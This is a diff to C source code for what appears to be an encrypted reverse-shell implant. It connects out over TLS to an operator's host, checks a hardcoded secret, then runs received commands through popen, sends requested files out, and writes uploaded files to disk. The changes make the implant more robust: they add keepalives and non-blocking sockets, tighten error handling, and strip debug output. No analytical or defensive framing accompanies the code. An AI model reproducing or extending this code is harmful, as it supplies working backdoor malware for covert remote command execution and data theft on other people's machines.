@@ -18,6 +18,10 @@ int resolveandconnect(int *sockfd, int8_t *addr, int port) {
   int connected = 0;
   struct timeval timeout;
   struct addrinfo hints, *serveraddr, *p;
+  int keepalive = 1;
+  int keepcnt = 3;
+  int keepidle = 5; 
+  int keepintvl = 5;
 
   memset(&hints, 0, sizeof(hints));
   hints.ai_family = AF_UNSPEC;
@@ -26,19 +30,16 @@ int resolveandconnect(int *sockfd, int8_t *addr, int port) {
   snprintf(portstr, 6,"%d", port);
 
   if ((status = getaddrinfo((char *)addr, portstr, &hints, &serveraddr)) != 0) {
-    //printf(stderr, "[-] ERROR: From getaddrinfo: %s\n", gai_strerror(status));
     return -1;
   }
 
   for(p = serveraddr; p != NULL; p = p->ai_next) {
     // Check to see if the addrsocket works
     if (((*sockfd) = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
-      //fprintf(stderr, "[~] WARN: Failed to acquire socket.\n");
       continue;
     }
 
     if (connect((*sockfd), p->ai_addr, p->ai_addrlen) < 0) {
-      //fprintf(stderr, "[~] WARN: Failed to bind.\n");
       continue;         
     }
     connected = 1;
@@ -48,7 +49,6 @@ int resolveandconnect(int *sockfd, int8_t *addr, int port) {
   freeaddrinfo(serveraddr);  // All done with the struct at this point
 
   if (connected == 0) {
-    //perror("[-] ERROR: Unable to connect.");
     return -1;
   }
 
@@ -59,6 +59,16 @@ int resolveandconnect(int *sockfd, int8_t *addr, int port) {
     return -1;
   }
   if (setsockopt(*sockfd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
+    return -1;
+  }
+
+  // Set keepalives
+  setsockopt(*sockfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int));
+  setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int));
+  setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int));
+  setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int));
+
+  if (fcntl(*sockfd, F_SETFL, O_NONBLOCK) < 0) {
     return -1;
   }
 
@@ -80,7 +90,7 @@ SSL_CTX* initCTX(void) {
 
   return ctx;
 }
-
+/*
 int newconn(SSL *ssl, pid_t *pids) {
   uint8_t buf[4096] = {0};
   pid_t pid;
@@ -108,7 +118,7 @@ int newconn(SSL *ssl, pid_t *pids) {
   }
 
 }
-
+*/
 int cmdshell(SSL *ssl) {
   //https://stackoverflow.com/questions/33884291/pipes-dup2-and-exec
   //https://stackoverflow.com/questions/21558937/i-do-not-understand-how-execlp-works-in-linux
@@ -119,7 +129,10 @@ int cmdshell(SSL *ssl) {
 
   fp = popen("date", "r");
   while (fgets((char *)buf, sizeof(buf), fp) != NULL) {
-    ssl_writeall(ssl, buf, sizeof(buf), &total_sent);
+    if (ssl_writeall(ssl, buf, sizeof(buf), &total_sent) < 0) {
+      pclose(fp);
+      return -1;
+    }
   }
   pclose(fp);
 
@@ -131,6 +144,9 @@ int cmdshell(SSL *ssl) {
     }
 
     if ((fp = popen((char *)buf, "r")) == NULL) {
+      if (ssl_writeall(ssl, (uint8_t *)"failed", 7, &total_sent) < 0) {
+        return -1;
+      }
       continue;
     }
 
@@ -156,14 +172,20 @@ int getfile(SSL *ssl) {
   size_t total_recv = 0, total_sent = 0, total_read = 0;
 
   // Tell the client we are good to begin the process
-  ssl_writeall(ssl, (uint8_t *)"300", 4, &total_sent);
+  if (ssl_writeall(ssl, (uint8_t *)"300", 4, &total_sent) < 0) {
+    return -1;
+  }
 
   // Recieve the name of the file that the client would like
-  ssl_readall(ssl, buf, sizeof(buf), &total_recv);
+  if (ssl_readall(ssl, buf, sizeof(buf), &total_recv) < 0) {
+    return -1;
+  }
 
   // Ensure we can open the file that is being asked for
   if((fd = open((char *)buf, O_RDONLY)) == -1) {
-    ssl_writeall(ssl, (uint8_t *)"-1", 3, &total_sent);
+    if (ssl_writeall(ssl, (uint8_t *)"-1", 3, &total_sent) < 0) {
+      return -1;
+    }
     return 0;
   }
 
@@ -171,14 +193,19 @@ int getfile(SSL *ssl) {
   fstat(fd, &st);
   filesize = st.st_size;
   sprintf((char *)ans, "%ld", filesize);
-  ssl_writeall(ssl, ans, sizeof(ans), &total_recv);
+  if (ssl_writeall(ssl, ans, sizeof(ans), &total_recv) < 0) {
+    close(fd);
+    return -1;
+  }
 
   // Send the file
   total_sent = 0;
   while(total_sent < (size_t)filesize) {
     memset(buf, 0, sizeof(buf));
     readall(fd, buf, (size_t)filesize - total_read % sizeof(buf), &total_read);
-    ssl_writeall(ssl, buf, sizeof(buf), &total_sent);
+    if (ssl_writeall(ssl, buf, sizeof(buf), &total_sent) < -1) {
+      break;
+    }
   }
 
   close(fd);
@@ -193,18 +220,27 @@ int putfile(SSL *ssl) {
   size_t total_recv = 0, total_sent = 0, written = 0;
 
   // Tell the client we are good to begin the process
-  ssl_writeall(ssl, (uint8_t *)"400", 4, &total_sent);
+  if (ssl_writeall(ssl, (uint8_t *)"400", 4, &total_sent) < 0) {
+    return -1;
+  }
 
   // Recieve the name of the file that the client would like
-  ssl_readall(ssl, buf, sizeof(buf), &total_recv);
+  if (ssl_readall(ssl, buf, sizeof(buf), &total_recv) < 0) {
+    return -1;
+  }
 
   // Ensure we can open the file that is being asked for
   if((fd = open((char *)buf, O_WRONLY | O_APPEND | O_CREAT, 0644)) == -1) {
-    ssl_writeall(ssl, (uint8_t *)"-1", 3, &total_sent);
+    if(ssl_writeall(ssl, (uint8_t *)"-1", 3, &total_sent) < 0) {
+      return -1;
+    }
     return 0;
   }
 
-  ssl_writeall(ssl, (uint8_t *)"401", 4, &total_sent);
+  if (ssl_writeall(ssl, (uint8_t *)"401", 4, &total_sent) < 0) {
+    close(fd);
+    return -1;
+  }
 
   // Recieve the filesize from the client
   ssl_readall(ssl, ans, sizeof(ans), &total_recv);
@@ -215,8 +251,12 @@ int putfile(SSL *ssl) {
 
   // Download the file
   while(written < (size_t)filesize) {
-    ssl_readall(ssl, buf, sizeof(buf), &total_recv);
-    writeall(fd, buf, (size_t)filesize - written % sizeof(buf), &written);
+    if (ssl_readall(ssl, buf, sizeof(buf), &total_recv) < 0) {
+      break;
+    }
+    if (writeall(fd, buf, (size_t)filesize - written % sizeof(buf), &written) < 0) {
+      break;
+    }
     memset(buf, 0, sizeof(buf));
   }
   close(fd);
@@ -225,35 +265,54 @@ int putfile(SSL *ssl) {
 }
 
 int entersession(SSL *ssl, int *clientfd) {
-  int count = 0, cmd, exit = 0, res;
+  int count = 0, cmd, conn = 0, res;
   size_t total_sent = 0, total_read = 0;
   uint8_t buf[4096] = {0};
 
-  SSL_set_fd(ssl, *clientfd);                         // Attach the socket descriptor to the SSL conneciton state
+  // Attach the socket descriptor to the SSL conneciton state
+  SSL_set_fd(ssl, *clientfd);                         
+  while((conn = SSL_connect(ssl)) <= 0) {
+    switch(SSL_get_error(ssl, conn)) {
+      case SSL_ERROR_WANT_READ:
+      case SSL_ERROR_WANT_WRITE:
+        break;
+    }
+  }
 
-  if ((exit = SSL_connect(ssl)) == FAILURE) {                  // Preform the SSL connection
-    ERR_print_errors_fp(stderr);
+  // Make sure we are gtg with non blocking mode
+  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
+  SSL_set_mode(ssl, SSL_MODE_ENABLE_PARTIAL_WRITE);
+  SSL_set_mode(ssl, SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);
+
+  // Message the client that we are ready to authenticate
+  if (ssl_writeall(ssl, (uint8_t *)"10", 3, &total_sent) < 0) {
+    return -1;
+  }          
+
+  // Read the authentication secret into memory
+  if (ssl_readall(ssl, buf, sizeof(buf), &total_read) < 0) {
     return -1;
   }
 
-  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
-
-  ssl_writeall(ssl, (uint8_t *)"10", 3, &total_sent);            // Message the client that we are ready to authenticate
-
-  ssl_readall(ssl, buf, sizeof(buf), &total_read);    // Read the authentication secret into memory
-  while ((res = strncmp((char *)buf, AUTH, strlen(AUTH)) != 0) && count < 3) {       // Keep checking to see if the sent auth message is gtg
-    ssl_writeall(ssl, (uint8_t *)"50", 3, &total_sent);
+  // Keep checking to see if the sent auth message is gtg
+  while ((res = strncmp((char *)buf, AUTH, strlen(AUTH)) != 0) && count < 3) {       
+    if (ssl_writeall(ssl, (uint8_t *)"50", 3, &total_sent) < 0) {
+      return -1;
+    }
     memset(buf, 0, sizeof(buf));
-    ssl_readall(ssl, buf, sizeof(buf), &total_read);  // Read the newly passed auth string
+    if (ssl_readall(ssl, buf, sizeof(buf), &total_read) < 0) {
+      return -1;
+    }
     count++;
   }
-  ssl_writeall(ssl, (uint8_t *)"10", 3, &total_sent);
+  if (ssl_writeall(ssl, (uint8_t *)"10", 3, &total_sent) < 0) {
+    return -1;
+  }
 
   while(1) {
     // Wait for the client to tell me to do something
     memset(buf, 0, sizeof(buf));
-    if ((res = ssl_readall(ssl, buf, sizeof(buf), &total_read)) < 0) {
-      fprintf(stderr, "Read Failed -- Moving On");
+    if (ssl_readall(ssl, buf, sizeof(buf), &total_read) < 0) {
       break;
     }
     cmd = atoi((char *)buf);
@@ -286,7 +345,7 @@ int entersession(SSL *ssl, int *clientfd) {
   }
 
   cleanup:
-  return exit;
+  return 0;
 }
 
 ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len, size_t *total_recv) {
@@ -295,11 +354,11 @@ ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len, size_t *total_recv) {
 
     while (recvd < len) {
       r = SSL_read(ssl, &buf[recvd], len-recvd);
-      if (r < 0) {
-        //perror("[-] ERROR: SSL_read encountered and error");
-        break;
-      } else if (r == 0) {
-        break;
+      if (r <= 0) {
+        if (SSL_get_error(ssl, r) == SSL_ERROR_WANT_READ) {
+          continue;
+        }
+        return -1;
       } else {
         recvd += r;
         (*total_recv) += r;
@@ -316,9 +375,11 @@ ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len, size_t *total_sent) {
   size_t sent = 0;
 
   while (sent < len) {
-    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) < 0) {
-      //perror("[-] ERROR: SSL_write encountered an error");
-      break;
+    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) <= 0) {
+      if (SSL_get_error(ssl, s) == SSL_ERROR_WANT_WRITE) {
+        continue;
+      }
+      return -1;
     }
     (*total_sent) += s;
     sent += s;
@@ -382,7 +443,6 @@ int main(void) {
     ssl = SSL_new(ctx);                             // Create new SSL connection state
 
     if ((res = resolveandconnect(&clientfd, (int8_t *)addr, atoi((char *)port))) != 0) {
-      //fprintf(stderr, "[-] Failed to connect to client.\n");
       goto reset;
     }
     
